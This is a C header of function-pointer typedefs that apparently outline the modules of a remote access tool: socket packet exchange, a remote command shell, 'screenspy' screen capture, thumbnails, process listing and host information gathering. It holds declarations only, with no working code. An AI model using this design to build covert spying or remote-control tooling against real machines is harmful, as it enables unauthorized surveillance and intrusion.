typedef buffer_t * (__cdecl *_buffer_new)(global_data_t *global_data);
typedef void (__cdecl *_buffer_free)(buffer_t *buf);
typedef void (__cdecl *_buffer_checkspace)(buffer_t *buf, size_t l);
typedef void (__cdecl *_buffer_write)(buffer_t *buf, const void *v, size_t l);
typedef void (__cdecl *_buffer_clear)(buffer_t *buf);

typedef void (__cdecl *_msgpack_lite_pack_nil)(buffer_t *buf);
typedef void (__cdecl *_msgpack_lite_pack_boolean)(buffer_t *buf, bool b);
typedef void (__cdecl *_msgpack_lite_pack_signed)(buffer_t *buf, int64_t i);
typedef void (__cdecl *_msgpack_lite_pack_unsigned)(buffer_t *buf, uint64_t i);
typedef void (__cdecl *_msgpack_lite_pack_float)(buffer_t *buf, float f);
typedef void (__cdecl *_msgpack_lite_pack_double)(buffer_t *buf, double d);
typedef void (__cdecl *_msgpack_lite_pack_real)(buffer_t *buf, double d);
typedef void (__cdecl *_msgpack_lite_pack_map_size)(buffer_t *buf, uint32_t n);
typedef void (__cdecl *_msgpack_lite_pack_str)(buffer_t *buf, const char *v);
typedef void (__cdecl *_msgpack_lite_pack_widestr)(buffer_t *buf, const wchar_t *v);
typedef void (__cdecl *_msgpack_lite_pack_bin_size)(buffer_t *buf, uint32_t n);
typedef void (__cdecl *_msgpack_lite_pack_bin)(buffer_t *buf, const void* v, uint32_t l);
typedef void (__cdecl *_msgpack_lite_pack_array_size)(buffer_t *buf, uint32_t n);
typedef void (__cdecl *_msgpack_lite_pack_insert)(buffer_t *buf, const void *v, uint32_t l);

typedef int (__cdecl *_send_packet)(global_data_t *global_data, SOCKET s, uint8_t cmd, const char *buf, size_t size);
typedef int (__cdecl *_recv_packet)(global_data_t *global_data, SOCKET s, uint8_t *cmd, void **buf, size_t *size);

typedef bitmap_t * (__cdecl *_bitmap_new)(global_data_t *global_data, HDC src_dc, int bit_count, int width, int height);
typedef void (__cdecl *_bitmap_free)(bitmap_t *bmp);
typedef void * (__cdecl *_bitmap_scan_line)(bitmap_t *bmp, int line);
typedef void (__cdecl *_bitmap_save)(bitmap_t *bmp, buffer_t *buf);

typedef void (__cdecl *_get_lan_info)(global_data_t *global_data, char *info);
typedef void (__cdecl *_get_os_version)(global_data_t *global_data, char *info, int size);
typedef uint32_t (__cdecl *_get_cpu_frequency)(global_data_t *global_data);

typedef int (__cdecl *_cmd_shell_initialize)(global_data_t *global_data, SOCKET s);
typedef int (__cdecl *_cmd_shell_send_result)(global_data_t *global_data, SOCKET s);
typedef int (__cdecl *_cmd_shell_execute)(global_data_t *global_data, SOCKET s, const char *cmd);
typedef int (__cdecl *_cmd_shell_finalize)(global_data_t *global_data, SOCKET s);

typedef int (__cdecl *_thumbnail_send)(global_data_t *global_data, SOCKET s);


typedef int (__cdecl *_screenspy_initalize)(global_data_t *global_data, SOCKET s, int bit_count);
typedef int (__cdecl *_screenspy_send)(global_data_t *global_data, SOCKET s);
typedef int (__cdecl *_screenspy_finalize)(global_data_t *global_data, SOCKET s);

typedef int (__cdecl *_process_send_list)(global_data_t *global_data, SOCKET s);